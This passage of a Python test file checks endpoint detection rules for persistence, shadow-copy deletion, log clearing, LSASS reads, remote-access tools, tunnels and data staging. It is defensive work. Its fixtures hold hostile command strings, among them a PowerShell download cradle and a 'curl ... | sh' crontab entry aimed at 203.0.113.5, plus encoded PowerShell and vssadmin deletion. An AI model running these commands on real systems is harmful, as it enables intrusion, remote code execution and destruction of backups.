    assert c.facts["entry"] == "a user's crontab" and "/u" not in json.dumps(c.facts)   # the file path names the user
    sys_cron = persist(T0, "crontab", event="", minute="0", hour="3", day_of_month="*", month="*", day_of_week="*",
                       command="/opt/backup/run.sh", path="/etc/cron.d/backup")
    assert settle(NewPersistence(st()), sys_cron)[0].facts["entry"] == "backup"


def test_run_key_payloads_without_a_drive_letter_still_alert():
    # review of #137: a Run key's value is often a bare `powershell -nop -w hidden -c iex (...)` or `mshta http://...`
    det = NewPersistence(st())
    rows = [persist(T0, "startup_items", name="Updater", path="powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')",
                    args="", source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u"),
            persist(T0, "startup_items", name="Helper", path=r"cmd /c start C:\\Users\\<user>\\Downloads\\x.exe", args="",
                    source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u"),
            persist(T0, "startup_items", name="Loader", path="rundll32 x.dll,Entry", args="",
                    source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u")]
    enc, dl, ld = settle(det, *rows)
    assert (enc.base_severity, enc.facts["program"], enc.facts["signals"]) == (4, "powershell.exe", ["an encoded or download-and-run command"])
    assert (dl.base_severity, dl.facts["program"], dl.facts["folder"]) == (4, "cmd.exe", "downloads")
    assert (ld.base_severity, ld.facts["program"], ld.facts["shell"]) == (3, "rundll32.exe", True)
    for c in (enc, dl, ld):
        no_paths(c)
    assert _entry_key("update_added") == "update_added" and _entry_key("backup_cache") == "backup_cache"


def test_a_corrupted_saved_known_set_is_discarded_at_restore():
    import pytest
    for bad in ({"known": "junk"}, {"known": {"$items": [[["a"], 1.0]]}}):
        with pytest.raises(ValueError):
            NewPersistence(st()).restore(bad)
    tmp = persist(T0, "crontab", event="@reboot", minute="", hour="", day_of_month="", month="", day_of_week="",
                  command="/tmp/.x/run.sh", path="/var/spool/cron/crontabs/u")
    (bad,) = settle(NewPersistence(st()), tmp)
    assert bad.base_severity == 4 and bad.facts["folder"] == "temp"
    pipe = persist(T0, "crontab", event="", minute="0", hour="*", day_of_month="*", month="*", day_of_week="*",
                   command="curl -s https://203.0.113.5/x | sh", path="/var/spool/cron/crontabs/u")
    (dl,) = settle(NewPersistence(st()), pipe)
    assert dl.base_severity == 4 and dl.facts["signals"] and dl.facts["url"]
    agent = persist(T0, "launchd_run_at_load", label="com.example.helper", program="/Users/u/Library/helper.sh",
                    program_arguments="", path="/Users/u/Library/LaunchAgents/com.example.helper.plist")
    (la,) = settle(NewPersistence(st()), agent)
    assert la.facts["kind"] == "launch agent" and la.facts["entry"] == "com.example.helper" and la.facts["folder"] == "profile"


# ------------------------------------------------------------ R24 destructive or evasive command

VSSADMIN = r"C:\Windows\System32\vssadmin.exe"


def test_shadow_copies_or_logs_removed_is_must_alert_on_any_program():
    (c,) = run(DestructiveCommand(st()), start(T0, VSSADMIN, CMD, cmd_shadow="1"))
    assert c.must_alert and c.base_severity == 5 and c.detector == "host_destructive"
    assert c.facts["harm"] == ["shadow copies or backups removed"] and c.facts["program"] == "vssadmin.exe"
    # `cmd /c vssadmin delete shadows`: cmd's start and vssadmin's carry the same line milliseconds apart: one case
    chain = DestructiveCommand(st())
    assert len(run(chain, start(T0, CMD, EXPLORER, cmd_shadow="1"), start(T0 + 0.2, VSSADMIN, CMD, cmd_shadow="1"))) == 1
    assert len(run(chain, start(T0 + 120, VSSADMIN, CMD, cmd_shadow="1"))) == 1                # two minutes on: a new command
    assert c.facts["parent"] == "cmd.exe" and c.facts["parent_class"] == "shell" and c.indicators == ["vssadmin.exe"]
    no_paths(c)
    (logs,) = run(DestructiveCommand(st()), start(T0, PS, EXPLORER, cmd_logclear="1", cmd_hidden="1"))
    assert logs.must_alert and logs.facts["harm"] == ["event logs cleared"] and logs.facts["unusual"] == ["a hidden window"]


def test_defender_and_account_changes_alert_but_can_be_suppressed():
    (d,) = run(DestructiveCommand(st()), start(T0, PS, EXPLORER, cmd_defender="1"))
    assert (d.base_severity, d.must_alert) == (4, False) and d.facts["harm"] == ["Defender turned off or given an exclusion"]
    (a,) = run(DestructiveCommand(st()), start(T0, CMD, EXPLORER, cmd_admin="1"))
    assert (a.base_severity, a.must_alert) == (4, False) and a.title == "Protection or accounts changed on the PC"
    (both,) = run(DestructiveCommand(st()), start(T0, PS, EXPLORER, cmd_defender="1", cmd_shadow="1"))
    assert both.must_alert and len(both.facts["harm"]) == 2
    assert run(DestructiveCommand(st()), start(T0, PS, EXPLORER, cmd_enc="1", cmd_dl="1")) == []   # R17's signals are R17's
    assert run(DestructiveCommand(st()), start(T0, VSSADMIN, CMD)) == []                           # vssadmin list shadows: nothing
    (rec,) = run(DestructiveCommand(st()), start(T0, CMD, EXPLORER, cmd_recovery="1"))
    assert (rec.base_severity, rec.must_alert, rec.facts["harm"]) == (4, False, ["Windows recovery turned off"])   # a documented repair step


def test_the_agent_keeps_the_command_line_for_exactly_the_r24_patterns():
    """The kept-cmdline CASE in the agent's Sysmon query must carry the same five regexes as the flags, or a case
    arrives with no text in the agent's log to investigate (review of #141)."""
    import json
    import re
    from pathlib import Path
    raw = Path(__file__).resolve().parents[1].joinpath("agents", "config", "osquery.conf").read_text()
    q = json.loads(re.sub(r"^\s*//.*$", "", raw, flags=re.MULTILINE), strict=False)["schedule"]["sysmon_events"]["query"]
    keep = q[:q.index(" END AS cmdline")]
    for flag in ("shadow", "recovery", "logclear", "defender", "admin"):
        i = q.index(f" AS cmd_{flag}")
        pattern = re.findall(r"'((?:[^'\\]|\\.)*)', 0\) IS NOT NULL\)$", q[:i])[-1]
        assert f"'{pattern}', 0) IS NOT NULL)" in keep, flag


def test_the_rule_and_its_signals_are_wired_in():
    from tapwatch.hostrules import NAMES, flags_of
    from tapwatch.router import CODE_ONLY
    assert "host_destructive" in NAMES and "host_destructive" in CODE_ONLY
    assert flags_of({"cmd_shadow": "1", "cmd_recovery": "1", "cmd_admin": "1", "cmd_url": "1"}) == ("shadow", "recovery", "admin", "url")


# ------------------------------------------------------------ R25 discovery burst, R26 browser extension, WMI in R23

WHOAMI, SYSINFO, NLTEST, IPCONFIG = (rf"C:\Windows\System32\{p}" for p in ("whoami.exe", "systeminfo.exe", "nltest.exe", "ipconfig.exe"))
ODD = r"C:\Users\<user>\AppData\Local\Temp\updater.exe"


def test_three_discovery_tools_from_one_program_alert_and_a_shell_is_a_digest_item():
    (c,) = run(DiscoveryBurst(st()), start(T0, WHOAMI, ODD), start(T0 + 20, SYSINFO, ODD), start(T0 + 40, IPCONFIG, ODD))
    assert c.base_severity == 4 and c.detector == "host_recon" and c.facts["programs"] == ["ipconfig.exe", "systeminfo.exe", "whoami.exe"]
    assert c.indicators == ["updater.exe"]
    no_paths(c)
    (typed,) = run(DiscoveryBurst(st()), start(T0, WHOAMI, CMD), start(T0 + 20, NLTEST, CMD), start(T0 + 40, SYSINFO, CMD))
    assert typed.base_severity == 3 and typed.facts["parent_class"] == "shell"
    # `cmd /c whoami` from an implant: the shell's own start shows a non-interactive parent, so it alerts
    det = DiscoveryBurst(st())
    burst = [start(T0, CMD, ODD, guid="{shell}")] + [
        dict(start(T0 + 5 + i, p, CMD, guid=f"{{c{i}}}"), columns={**start(T0 + 5 + i, p, CMD, guid=f"{{c{i}}}")["columns"], "parent_guid": "{shell}"})
        for i, p in enumerate((WHOAMI, NLTEST, SYSINFO))]
    (implant,) = run(det, *burst)
    assert implant.base_severity == 4 and implant.facts["parent_started_by"] == "updater.exe"
    det = DiscoveryBurst(st())
    burst[0] = start(T0, CMD, r"C:\Windows\explorer.exe", guid="{shell}")
    assert run(det, *burst)[0].base_severity == 3                                    # a shell Explorer started: typing


def test_weak_tools_spread_out_or_alone_raise_nothing_and_a_burst_is_one_case():
    weak = [start(T0 + i, rf"C:\Windows\System32\{p}", CMD) for i, p in enumerate(("ipconfig.exe", "netstat.exe", "nslookup.exe", "whoami.exe"))]
    assert run(DiscoveryBurst(st()), *weak) == []                                    # one strong tool: troubleshooting
    assert run(DiscoveryBurst(st()), start(T0, WHOAMI, ODD), start(T0 + 400, SYSINFO, ODD), start(T0 + 800, IPCONFIG, ODD)) == []
    burst = [start(T0 + i * 5, rf"C:\Windows\System32\{p}", ODD) for i, p in enumerate(("whoami.exe", "systeminfo.exe", "nltest.exe", "net.exe", "arp.exe"))]
    assert len(run(DiscoveryBurst(st()), *burst)) == 1


def ext(t, name, ident, perms, change="added"):
    return {"_type": "osquery", "name": "chrome_extensions", "unixTime": int(t), "ts": int(t), "action": change,
            "columns": {"username": "u", "name": name, "identifier": ident, "version": "1.0", "permissions": perms}}


def test_new_extensions_by_what_they_can_reach():
    det = BrowserExtension(st())
    rows = [ext(T0, "Shady helper", "a" * 32, "storage, debugger, tabs"), ext(T0, "Coupon finder", "b" * 32, "cookies, storage"),
            ext(T0, "Dark theme", "c" * 32, "storage")]
    a, b = settle(det, *rows)
    assert (a.base_severity, a.facts["apis"], a.detector) == (4, ["debugger"], "host_extension")
    assert (b.base_severity, b.facts["apis"]) == (3, ["cookies"])
    upd = [ext(T0 + 86400, "Coupon finder", "b" * 32, "cookies, storage", "removed"), ext(T0 + 86400, "Coupons", "b" * 32, "cookies, storage")]
    assert settle(det, *upd) == []                                                  # an update (even renamed) is a change
    opt = ext(T0 + 86400, "Helper", "d" * 32, "storage")
    opt["columns"]["optional_permissions"] = "debugger"
    assert settle(det, opt)[0].base_severity == 4                                   # asked for at runtime still counts
    dump = [ext(T0 + 2 * 86400, f"E{i}", str(i) * 32, "cookies") for i in range(DUMP_MIN)]
    assert settle(det, *dump) == []                                                 # the first run lists everything


def test_a_new_wmi_consumer_is_an_alert_whatever_it_runs():
    row = persist(T0, "wmi_persistence", kind="cli", name="Updater", action=r"C:\Windows\System32\cmd.exe",
                  args="/c powershell -enc AAAA")
    (c,) = settle(NewPersistence(st()), row)
    assert c.base_severity == 4 and c.facts["kind"] == "WMI event subscription" and c.facts["program"] == "cmd.exe"
    script = persist(T0, "wmi_persistence", kind="script", name="Beacon", action="VBScript", args="")
    (s,) = settle(NewPersistence(st()), script)
    assert s.base_severity == 4 and s.facts["script"] and s.facts["program"] == "vbscript" and s.facts["folder"] == "unknown"


# ------------------------------------------------------------ R27 Linux temp, memory or shell connections; Linux persistence

def lconn(t, path, parent="bash", remote=DST, port=443):
    return {"_type": "osquery", "name": "bpf_connections", "unixTime": int(t), "ts": int(t), "action": "added",
            "columns": {"time": str(int(t)), "pid": "4242", "parent": "4000", "path": path, "remote_address": remote,
                        "remote_port": str(port), "protocol": "6", "parent_name": parent}}


def test_linux_temp_memory_and_shell_connections_alert():
    det = LinuxSuspiciousConnect(st())
    (tmp,) = run(det, lconn(T0, "/tmp/.x/agent"))
    assert (tmp.base_severity, tmp.facts["how"], tmp.indicators) == (4, "temp", ["agent"]) and tmp.detector == "host_linux_connect"
    (mem,) = run(det, lconn(T0, "/memfd:payload (deleted)"))
    assert mem.facts["how"] == "memory"
    (sh,) = run(det, lconn(T0, "/usr/bin/bash", parent="python3", port=4444))
    assert sh.facts["how"] == "shell" and sh.title.startswith("A shell or netcat")
    no_paths(tmp)
    assert run(LinuxSuspiciousConnect(st()), lconn(T0, "/usr/bin/curl"), lconn(T0, "/tmp/x", remote="192.168.50.1")) == []


def test_linux_persistence_keys_alert_and_units_are_digest_items():
    key = persist(T0, "authorized_keys", algorithm="ssh-ed25519", key_tail="AAAAC3NzaC1lZDI1")
    (k,) = settle(NewPersistence(st()), key)
    assert (k.base_severity, k.facts["entry"], k.facts["kind"]) == (4, "authorized key (ssh-ed25519)", "SSH authorized key")
    unit = persist(T0, "systemd_units", name="sync.service", path="/home/u/.config/systemd/user/sync.service")
    (u,) = settle(NewPersistence(st()), unit)
    assert (u.base_severity, u.facts["entry"], u.facts["folder"]) == (3, "sync.service", "profile")
    assert "/home/" not in json.dumps(u.facts) and "/home/" not in json.dumps(k.facts)
    units = [persist(T0, "systemd_units", name=f"u{i}.service", path=f"/home/u/.config/systemd/user/u{i}.service") for i in range(24)]
    assert settle(NewPersistence(st()), *units) == []                              # the first run after deploy: an inventory
    first = dict(key, counter=0)
    assert settle(NewPersistence(st()), first) == []                               # osquery's first run, even one row
    assert len(settle(NewPersistence(st()), dict(key, counter=7))) == 1             # a later run: a new key


def test_ipv4_mapped_lan_addresses_are_not_outside():
    from tapwatch.hostrules import outside
    assert not outside("::ffff:192.168.50.1", 443) and not outside("::ffff:127.0.0.1", 443)
    assert outside("::ffff:203.0.113.5", 443)


def test_transient_systemd_scopes_are_not_startup_items():
    """#811: the capture container's docker-<id>.scope, listed by osquery's startup_items on Linux."""
    scope = persist(T0, "startup_items", name="docker-19b6954697.scope", path="docker-19b6954697.scope", args="",
                    source="systemd", status="active", username="root")
    assert settle(NewPersistence(st()), scope) == []
    disguised = persist(T0, "startup_items", name="Updater.SCOPE", path=r"C:\Users\Public\evil.exe", args="",
                        source=r"HKEY_USERS\S-1-5-21-1-2-3-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                        status="enabled", username="u")
    assert len(settle(NewPersistence(st()), disguised)) == 1                      # a Run key named like a scope still counts


# ------------------------------------------------------------ R28 Linux command-line signals

def lexec(t, path, **flags):
    cols = {"time": str(int(t)), "pid": "5000", "parent": "4000", "path": path, **{f"lcmd_{k}": "1" for k in flags},
            "cmdline": "never read by the rule"}
    return {"_type": "osquery", "name": "bpf_process_events", "unixTime": int(t), "ts": int(t), "action": "added", "columns": cols}


def test_linux_command_signals_alert_and_a_temp_chmod_is_a_digest_item():
    (dl,) = run(LinuxCommand(st()), lexec(T0, "/usr/bin/bash", dlrun=1))
    assert (dl.base_severity, dl.detector, dl.facts["signals"]) == (4, "host_linux_cmd", ["a download piped into a shell"])
    assert "cmdline" not in dl.facts and "never read" not in str(dl.facts) and dl.indicators == ["bash"]
    no_paths(dl)
    (rs,) = run(LinuxCommand(st()), lexec(T0, "/usr/bin/python3.12", revshell=1))
    assert rs.base_severity == 4 and rs.facts["signals"] == ["a reverse shell"]
    (tmp,) = run(LinuxCommand(st()), lexec(T0, "/usr/bin/chmod", tmpexec=1))
    assert tmp.base_severity == 3
    assert run(LinuxCommand(st()), lexec(T0, "/usr/bin/git")) == []


def test_sudo_and_the_shell_it_runs_are_one_case():
    det = LinuxCommand(st())
    assert len(run(det, lexec(T0, "/usr/bin/sudo", dlrun=1), lexec(T0 + 0.1, "/usr/bin/bash", dlrun=1))) == 1
    assert len(run(det, lexec(T0 + 120, "/usr/bin/bash", dlrun=1))) == 1                # two minutes on: a new command


def test_the_agent_keeps_the_linux_command_line_only_when_a_signal_fires():
    """The flags are computed once in a subquery and the keep clause reads them, so the two cannot drift."""
    import re as _re
    from pathlib import Path
    raw = Path(__file__).resolve().parents[1].joinpath("agents", "config", "osquery.conf").read_text()
    q = json.loads(_re.sub(r"^\s*//.*$", "", raw, flags=_re.MULTILINE), strict=False)["schedule"]["bpf_process_events"]["query"]
    flags = ("dlrun", "revshell", "b64exec", "histclear", "tmpexec", "miner")
    assert "CASE WHEN " + " OR ".join(f"lcmd_{f}" for f in flags) + " THEN cmdline END AS cmdline" in q
    assert all(f") IS NOT NULL) AS lcmd_{f}" in q for f in flags)


# ------------------------------------------------------------ R29 LSASS memory read

def lsass(t, source, granted="0x1010", source_guid="{a1}"):
    """A real event-10 row: no ProcessGuid (the agent's `guid` is null), SourceProcessGUID instead."""
    row = sysmon(10, t, "", source_path=source, target_path=r"C:\Windows\system32\lsass.exe", granted=granted,
                 source_guid=source_guid)
    row["columns"]["guid"] = None
    return row


def test_reading_lsass_memory_alerts_and_from_temp_it_is_must_alert():
    (c,) = run(LsassAccess(st()), lsass(T0, r"C:\Program Files\Vendor\agent.exe"))
    assert (c.base_severity, c.must_alert, c.detector, c.facts["access"]) == (4, False, "host_lsass", "0x1010")
    assert c.indicators == ["agent.exe"]
    no_paths(c)
    (bad,) = run(LsassAccess(st()), lsass(T0, TEMP_EXE, granted="0x1fffff"))
    assert bad.must_alert and bad.base_severity == 5 and bad.facts["folder"] == "temp"


def test_querying_lsass_or_another_target_raises_nothing():
    assert run(LsassAccess(st()), lsass(T0, r"C:\Windows\System32\Taskmgr.exe", granted="0x1400")) == []
    other = sysmon(10, T0, "{a2}", source_path=TEMP_EXE, target_path=r"C:\Windows\explorer.exe", granted="0x1fffff")
    assert run(LsassAccess(st()), other) == []


def test_a_document_app_starting_the_lsass_reader_is_must_alert():
    """Review of #166: the parent comes through the start's SourceProcessGUID join."""
    tool = r"C:\Program Files\Vendor\helper.exe"
    (c,) = run(LsassAccess(st()), start(T0, tool, WORD, guid="{x9}"), lsass(T0 + 2, tool, source_guid="{x9}"))
    assert c.must_alert and c.facts["parent_class"] == "document" and c.facts["parent"] == "WINWORD.EXE"


# ------------------------------------------------------------ #28 pass 2: Linux system changes in R23, miners in R28

def test_linux_system_changes_by_how_close_they_are_to_root():
    det = NewPersistence(st())
    rows = [persist(T0, "ld_preload", path="/etc/ld.so.preload", size="24"),
            persist(T0, "suid_bin", path="/home/u/.cache/x/helper", permissions="S"),
            persist(T0, "suid_bin", path="/usr/bin/newgrp2", permissions="S"),
            persist(T0, "kernel_modules", name="hid_logger", status="Live"),
            persist(T0, "risky_containers", name="/secret-project", image="ubuntu:24.04", privileged="1", sock="0")]
    pre, home_suid, pkg_suid, mod, ctr = settle(det, *rows)
    assert (pre.base_severity, pre.must_alert, pre.facts["entry"]) == (5, True, "ld.so.preload")
    assert (home_suid.base_severity, home_suid.facts["folder"], home_suid.facts["entry"]) == (4, "profile", "helper")
    assert pkg_suid.base_severity == 3 and mod.base_severity == 3 and mod.facts["entry"] == "hid_logger"
    assert ctr.facts["privileged"] and not ctr.facts["docker_socket"] and ctr.base_severity == 3
    assert ctr.facts["entry"] == "ubuntu:24.04" and "secret-project" not in json.dumps(ctr.facts)   # the image, not the name
    for c in (pre, home_suid, ctr):
        assert "/home/" not in json.dumps(c.facts)


def test_new_linux_listeners_only_from_shells_or_user_folders():
    det = NewPersistence(st())
    rows = [persist(T0, "listening_ports", name="nc", path="/usr/bin/nc.openbsd", port="4444", protocol="6", address="0.0.0.0"),
            persist(T0, "listening_ports", name="srv", path="/home/u/tool/srv", port="8080", protocol="6", address="0.0.0.0"),
            persist(T0, "listening_ports", name="nginx", path="/usr/sbin/nginx", port="80", protocol="6", address="0.0.0.0"),
            persist(T0, "listening_ports", name="svchost.exe", path=r"C:\Windows\System32\svchost.exe", port="5050",
                    protocol="17", address="0.0.0.0")]
    nc, home = settle(det, *rows)
    assert nc.facts["shell"] and nc.base_severity == 4 and nc.facts["port"] == 4444
    assert home.facts["folder"] == "profile" and not home.facts["shell"]
    loop = persist(T0 + 3600, "listening_ports", name="dev", path="/home/u/app", port="9000", protocol="6", address="127.0.0.1")
    assert settle(det, loop) == []                                                  # loopback only: nothing
    # review of #169: a dev server in the home folder that stops and comes back an hour later is a restart
    dev = {"name": "uvicorn", "path": "/home/u/.venv/bin/uvicorn", "port": "8000", "protocol": "6", "address": "0.0.0.0"}
    fresh = NewPersistence(st())
    assert settle(fresh, persist(T0, "listening_ports", "removed", **dev)) == []
    assert settle(fresh, persist(T0 + 3600, "listening_ports", **dev)) == []
    # node on 0.0.0.0 under /usr is a dev server, not a bind shell; a /tmp copy taking over a known port is new
    node = persist(T0, "listening_ports", name="node", path="/usr/bin/node", port="3000", protocol="6", address="0.0.0.0")
    assert settle(NewPersistence(st()), node) == []
    other = NewPersistence(st())
    settle(other, persist(T0, "listening_ports", "removed", name="nginx", path="/usr/sbin/nginx", port="8080", protocol="6", address="0.0.0.0"))
    (tmp,) = settle(other, persist(T0 + 3600, "listening_ports", name="nginx", path="/tmp/nginx", port="8080", protocol="6", address="0.0.0.0"))
    assert tmp.facts["folder"] == "temp"


def test_a_startup_item_removed_and_listed_again_is_not_new():
    """#911-#924: osquery dropped WSL's /etc/init.d scripts for one run and listed them again at the next."""
    cron = {"name": "cron", "path": "/etc/init.d/cron", "args": "", "source": "/etc/init.d", "status": "enabled"}
    det = NewPersistence(st())
    assert settle(det, persist(T0, "startup_items", "removed", **cron)) == []
    assert settle(det, persist(T0 + 3600, "startup_items", **cron)) == []
    # the same name back but running a script in /tmp is a different entry, and judged
    (c,) = settle(det, persist(T0 + 7200, "startup_items", **dict(cron, path="/tmp/.c/cron.sh")))
    assert c.facts["folder"] == "temp" and c.base_severity == 4


def test_a_cryptominer_command_line_is_an_r28_case():
    (c,) = run(LinuxCommand(st()), lexec(T0, "/tmp/.x/kworker", miner=1))
    assert c.base_severity == 4 and c.facts["signals"] == ["a cryptocurrency miner"]


# ------------------------------------------------------------ R36 remote-access tools (#39)

WEEK = 8 * 86400   # past R36's 7-day learning window


def test_remote_access_tools_seen_in_the_first_week_are_learned():
    det = RemoteAccessTool(st())
    office_rmm = r"C:\Program Files\NinjaRMMAgent\NinjaRMMAgent.exe"
    assert run(det, start(T0, EXPLORER, EXPLORER), start(T0 + 3600, office_rmm, EXPLORER)) == []
    (c,) = run(det, start(T0 + WEEK, r"C:\Program Files\TeamViewer\TeamViewer.exe", EXPLORER))
    assert (c.detector, c.base_severity, c.must_alert, c.facts["tool"], c.facts["folder"]) == \
        ("host_rmm", 3, False, "TeamViewer", "installed")
    assert run(det, start(T0 + WEEK + 60, office_rmm, EXPLORER),
               start(T0 + WEEK + 120, r"C:\Program Files\TeamViewer\TeamViewer.exe", EXPLORER)) == []
    no_paths(c)


def test_a_portable_remote_access_tool_is_scored_by_its_folder_and_parent():
    def first(path, parent=EXPLORER):
        det = RemoteAccessTool(st())
        return run(det, start(T0, EXPLORER, EXPLORER), start(T0 + WEEK, path, parent))
    (dl,) = first(r"C:\Users\<user>\Downloads\AnyDesk.exe")
    assert (dl.base_severity, dl.must_alert, dl.indicators, dl.facts["program"]) == (4, False, ["AnyDesk"], "anydesk.exe")
    (tmp,) = first(r"C:\Users\<user>\AppData\Local\Temp\AnyDesk.exe")
    assert (tmp.base_severity, tmp.must_alert, tmp.facts["folder"]) == (5, True, "temp")
    (doc,) = first(r"C:\Program Files\AnyDesk\AnyDesk.exe", OUTLOOK)
    assert doc.must_alert and doc.facts["parent_class"] == "document"
    (qa,) = first(r"C:\Windows\System32\quickassist.exe")
    assert (qa.facts["tool"], qa.base_severity, qa.must_alert) == ("Quick Assist", 4, False)
    for c in (dl, tmp, doc, qa):
        no_paths(c)


def test_linux_remote_access_tools_and_the_expected_allowance():
    det = RemoteAccessTool(st())
    (c,) = run(det, lexec(T0, "/usr/bin/bash"), lexec(T0 + WEEK, "/tmp/.x/rustdesk"))
    assert (c.facts["tool"], c.facts["folder"], c.must_alert) == ("RustDesk", "temp", True)
    allowed = RemoteAccessTool(st(), expected={PC: {"anydesk.com"}})
    assert run(allowed, start(T0, EXPLORER, EXPLORER), start(T0 + WEEK, r"C:\Users\<user>\Downloads\AnyDesk.exe", EXPLORER)) == []


def test_remote_access_learning_survives_a_restart():
    det = RemoteAccessTool(st())
    run(det, start(T0, r"C:\Program Files\AnyDesk\AnyDesk.exe", EXPLORER))
    again = RemoteAccessTool(st())
    again.restore(json.loads(json.dumps(det.snapshot())))
    assert run(again, start(T0 + WEEK, r"C:\Program Files\AnyDesk\AnyDesk.exe", EXPLORER)) == []
    assert len(run(again, start(T0 + WEEK, r"C:\Program Files\RustDesk\rustdesk.exe", EXPLORER))) == 1
    assert "host_rmm" in NAMES and "host_rmm" in CODE_ONLY
    assert any(isinstance(r, RemoteAccessTool) for r in build({}))


def test_risky_remote_access_starts_are_never_learned_and_renamed_copies_match():
    det = RemoteAccessTool(st())
    (c,) = run(det, start(T0, r"C:\Users\<user>\AppData\Local\Temp\AnyDesk.exe", EXPLORER))   # day one, Temp
    assert c.must_alert
    renamed = start(T0 + WEEK, r"C:\Users\<user>\Downloads\invoice_viewer.exe", EXPLORER, original_name="rustdesk.exe")
    (r,) = run(det, renamed)
    assert (r.facts["tool"], r.facts["renamed"], r.indicators, r.facts["program"]) == \
        ("RustDesk", True, ["RustDesk"], "invoice_viewer.exe")
    assert "renamed" in summarize(r, Assets({}))
    quiet = RemoteAccessTool(st(), expected_tools=["NinjaOne", "quick assist"])
    assert run(quiet, start(T0, EXPLORER, EXPLORER), start(T0 + WEEK, r"C:\Windows\System32\quickassist.exe", EXPLORER)) == []


def test_a_learned_tool_started_from_temp_or_by_outlook_still_reports_once():
    """Review of #235: the owner's TeamViewer learned in week one; a portable copy in Temp later is the scam shape."""
    det = RemoteAccessTool(st())
    tv = r"C:\Program Files\TeamViewer\TeamViewer.exe"
    assert run(det, start(T0, tv, EXPLORER)) == []
    (c,) = run(det, start(T0 + WEEK, r"C:\Users\<user>\AppData\Local\Temp\TeamViewerQS.exe", EXPLORER))
    assert c.must_alert and c.facts["tool"] == "TeamViewer"
    assert run(det, start(T0 + WEEK + 60, tv, OUTLOOK)) == []      # one risky report per tool


# ------------------------------------------------------------ R37 tunnels and R38 staging (#39)

def _conf_query(name):
    import re as _re
    from pathlib import Path
    raw = Path(__file__).resolve().parents[1].joinpath("agents", "config", "osquery.conf").read_text()
    return json.loads(_re.sub(r"^\s*//.*$", "", raw, flags=_re.MULTILINE), strict=False)["schedule"][name]["query"]


def test_tunnel_and_sync_signals_never_keep_the_command_line():
    """A tunnel's token, an archive password or a repository's user:pass would land in a world-readable log."""
    q = _conf_query("bpf_process_events")
    keep = q[q.index("CASE WHEN lcmd_dlrun"):q.index("THEN cmdline END AS cmdline")]
    assert "tunnel" not in keep and "sync" not in keep and "archive" not in keep
    for name in ("bpf_process_events", "sysmon_events"):
        q = _conf_query(name)
        assert "AS sync_dest" in q and "AS archive_of" in q
    assert "e.pid = x.pid" in _conf_query("bpf_process_events")   # the markers of *this* process, not any process


def test_a_tunnel_alerts_and_an_attended_agent_session_makes_it_a_digest_item():
    (win,) = run(TunnelOpened(st()), start(T0, r"C:\Tools\ngrok.exe", EXPLORER, cmd_tunnel="1"))
    assert (win.detector, win.base_severity, win.must_alert, win.indicators) == ("host_tunnel", 4, False, ["ngrok.exe"])
    no_paths(win)
    (tmp,) = run(TunnelOpened(st()), start(T0, r"C:\Users\<user>\AppData\Local\Temp\cf.exe", EXPLORER, cmd_tunnel="1"))
    assert tmp.must_alert and tmp.base_severity == 5
    owner = lexec(T0, "/usr/local/bin/ngrok", tunnel=1)
    owner["columns"].update(claude_session="s1", claude_attended="1")
    (o,) = run(TunnelOpened(st()), owner)
    assert (o.base_severity, o.facts["agent_attended"]) == (3, True)
    unattended = lexec(T0, "/usr/bin/ssh", tunnel=1)
    unattended["columns"].update(claude_session="s2", claude_attended="0")
    (u,) = run(TunnelOpened(st()), unattended)
    assert (u.base_severity, u.facts["agent_unattended"]) == (4, True)
    assert "nobody was watching" in summarize(u, Assets({}))
    assert run(TunnelOpened(st()), start(T0, r"C:\Tools\ngrok.exe", EXPLORER)) == []


def test_new_sync_destinations_are_digest_items_after_the_learning_week():
    det = FilesStaged(st())
    nightly = lexec(T0, "/usr/bin/restic", sync=1)
    nightly["columns"]["sync_dest"] = "backup.example.net"
    assert run(det, nightly) == []                                   # learned in week one
    again = lexec(T0 + WEEK, "/usr/bin/restic", sync=1)
    again["columns"]["sync_dest"] = "backup.example.net"
    assert run(det, again) == []
    (c,) = run(det, start(T0 + WEEK, r"C:\Program Files\rclone\rclone.exe", EXPLORER, cmd_sync="1", sync_dest="drive2"))
    assert (c.detector, c.base_severity, c.facts["tool"], c.facts["destination"], c.indicators) == \
        ("host_staging", 3, "rclone", "drive2", ["drive2"])
    assert run(det, start(T0 + WEEK + 60, r"C:\Program Files\rclone\rclone.exe", EXPLORER, cmd_sync="1",
                          sync_dest="drive2")) == []
    no_paths(c)
    restored = FilesStaged(st())
    restored.restore(json.loads(json.dumps(det.snapshot())))
    assert ("rclone", "drive2") in restored.known


def test_a_password_archive_of_documents_alerts():
    det = FilesStaged(st())
    (doc,) = run(det, start(T0, r"C:\Program Files\7-Zip\7z.exe", EXPLORER, cmd_archive_pw="1", archive_of="documents"))
    assert (doc.base_severity, doc.facts["archive_of"]) == (4, "documents") and "Documents" in doc.title
    (plain,) = run(FilesStaged(st()), lexec(T0, "/usr/bin/zip", archive_pw=1))
    assert plain.base_severity == 3 and plain.facts["archive_of"] is None
    assert {"host_tunnel", "host_staging"} <= set(NAMES) and {"host_tunnel", "host_staging"} <= CODE_ONLY


def test_r37_r38_review_fixes():
    """Review of #236: an attended session over SSH isn't the owner at the keyboard; no destination is one key."""
    ssh = lexec(T0, "/usr/bin/ssh", tunnel=1)
    ssh["columns"].update(claude_session="s3", claude_attended="1", via_ssh="1")
    (c,) = run(TunnelOpened(st()), ssh)
    assert (c.base_severity, c.facts["agent_unattended"], c.facts["via_ssh"]) == (4, True, True)
    det = FilesStaged(st())
    local = lexec(T0 + WEEK, "/usr/bin/restic", sync=1)
    (r,) = run(det, lexec(T0, "/usr/bin/ls"), local)
    assert r.facts["destination"] == "local or from the environment"
    (a,) = run(FilesStaged(st()), start(T0, r"C:\Program Files\7-Zip\7z.exe", EXPLORER, cmd_archive_pw="1",
                                         archive_of="desktop"))
    assert a.base_severity == 4


def test_the_conf_carries_exactly_the_fragments_the_pattern_source_builds():
    """tools/r37r38_patterns.py is the source of the R37/R38 SQL; the conf must not drift from it."""
    import importlib.util
    from pathlib import Path
    path = Path(__file__).resolve().parents[1] / "tools" / "r37r38_patterns.py"
    spec = importlib.util.spec_from_file_location("r37r38_patterns", path)
    m = importlib.util.module_from_spec(spec)
